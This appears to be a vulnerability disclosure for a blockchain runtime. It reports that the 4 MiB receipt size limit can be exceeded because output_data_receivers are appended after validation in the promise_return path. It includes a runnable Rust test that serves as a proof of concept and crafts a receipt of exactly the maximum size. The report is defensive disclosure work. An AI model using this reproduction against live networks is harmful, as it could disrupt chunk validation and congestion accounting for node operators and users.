### Title
Receipt Size Limit Bypassed via `promise_return` Post-Validation Mutation — (`runtime/runtime/src/lib.rs`)

### Summary

The `max_receipt_size` (4 MiB) invariant is broken in production. When a contract uses `promise_return` to redirect a receipt that is exactly at the size limit, the runtime appends `output_data_receivers` from the parent receipt to the child receipt **after** the size check has already passed. The resulting oversized receipt is committed to state and forwarded to other shards without re-validation. The codebase itself acknowledges this as an open bug (issue #12606) and has added a lenient `ExistingReceipt` validation mode specifically to avoid crashing when these receipts are later encountered.

### Finding Description

`validate_receipt` in `runtime/runtime/src/verifier.rs` enforces `max_receipt_size` only when `mode == ValidateReceiptMode::NewReceipt`: [1](#0-0) 

After this check passes, the runtime processes the `promise_return` path in `runtime/runtime/src/lib.rs`. When the executing receipt has non-empty `output_data_receivers` and the contract returns a `ReturnData::ReceiptIndex`, the runtime **mutates** the already-validated child receipt by appending the parent's `output_data_receivers` to it: [2](#0-1) 

No size re-check occurs after this mutation. The receipt is then forwarded or buffered: [3](#0-2) 

The same bypass exists for the `value_return` path: a contract returning a value of exactly `max_receipt_size` bytes causes a `DataReceipt` wrapping that value to exceed the limit, again without rejection.

The `ValidateReceiptMode::ExistingReceipt` variant was introduced specifically to tolerate these already-committed oversized receipts: [4](#0-3) 

The test suite confirms the bug is reachable and that oversized receipts do reach the incoming-receipts proof set of other shards: [5](#0-4) [6](#0-5) 

### Impact Explanation

1. **ChunkStateWitness size invariant broken.** `source_receipt_proofs` inside a `ChunkStateWitness` must stay within the 17 MiB budget. A single oversized receipt (up to ~8 MiB, since `max_receipt_size` + one `output_data_receivers` extension) can push the witness over the limit, causing chunk validators to reject the witness or produce a divergent result.

2. **Congestion control miscounting.** `compute_receipt_size` in `runtime/runtime/src/congestion_control.rs` re-serializes the receipt to get its size: [7](#0-6) 

When a `StateStoredReceipt` is read back, its `congestion_size` metadata was recorded at storage time from the already-oversized receipt, so the congestion accounting reflects the true (over-limit) size. This means the shard's outgoing-receipt budget is consumed faster than the protocol intends, potentially triggering false congestion signals.

3. **State commitment invariant violated.** Receipts committed to the delayed queue or forwarded cross-shard carry a size that violates the protocol-level `max_receipt_size` guarantee. Any downstream consumer (state sync, snapshot, resharding delta) that assumes this invariant holds may behave incorrectly.

### Likelihood Explanation

Any unprivileged user can deploy a contract and craft the two-step promise DAG (`A -then-> B`, where A does `promise_return(C)` with C sized to exactly `max_receipt_size`). No validator or privileged role is required. The attack is deterministic and reproducible, as confirmed by the existing test.

### Recommendation

After `output_data_receivers` are appended to the child receipt (lines 1029–1035 of `runtime/runtime/src/lib.rs`), re-measure the receipt's serialized size and return a `RuntimeError` (mapped to an `ActionError::NewReceiptValidationError(ReceiptSizeExceeded)`) if it now exceeds `max_receipt_size`. Apply the same post-mutation check to the `value_return` data-receipt construction path. Once the fix is deployed, the `ExistingReceipt` leniency can be tightened in a subsequent protocol upgrade.

### Proof of Concept

The existing test `test_max_receipt_size_promise_return` in `test-loop-tests/src/tests/max_receipt_size.rs` is a complete, runnable proof of concept: [8](#0-7) 

It deploys a contract, crafts a receipt C sized to exactly `max_receipt_size`, triggers `promise_return` so that `output_data_receivers` are appended post-validation, and then asserts (via `assert_oversized_receipt_occurred`) that an oversized receipt is present in the incoming-receipts proof of a shard — confirming the limit bypass reaches committed chain state.

#[test]
fn test_max_receipt_size_promise_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    // User calls a contract method
    // Contract method creates a DAG with two promises: [A -then-> B]
    // When promise A is executed, it creates a third promise - `C` and does a `promise_return`.
    // The DAG changes to: [C ->then-> B]
    // The receipt for promise C is a maximum size receipt.
    // Adding the `output_data_receivers` to C's receipt makes it go over the size limit.
    let base_receipt_template = Receipt::V0(ReceiptV0 {
        predecessor_id: account.clone(),
        receiver_id: account.clone(),
        receipt_id: CryptoHash::default(),
        receipt: ReceiptEnum::Action(ActionReceipt {
            signer_id: account.clone(),
            signer_public_key: account_signer.public_key().into(),
            gas_price: Balance::ZERO,
            output_data_receivers: vec![],
            input_data_ids: vec![],
            actions: vec![Action::FunctionCall(Box::new(FunctionCallAction {
                method_name: "noop".into(),
                args: vec![],
                gas: Gas::ZERO,
                deposit: Balance::ZERO,
            }))],
        }),
    });
    let base_receipt_template = action_receipt_v1_to_latest(&base_receipt_template);
    let base_receipt_size = borsh::object_length(&base_receipt_template).unwrap();
    let max_receipt_size = 4_194_304;
    let args_size = max_receipt_size - base_receipt_size;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_promise_return_method1".into(),
        format!("{{\"args_size\": {}}}", args_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
}
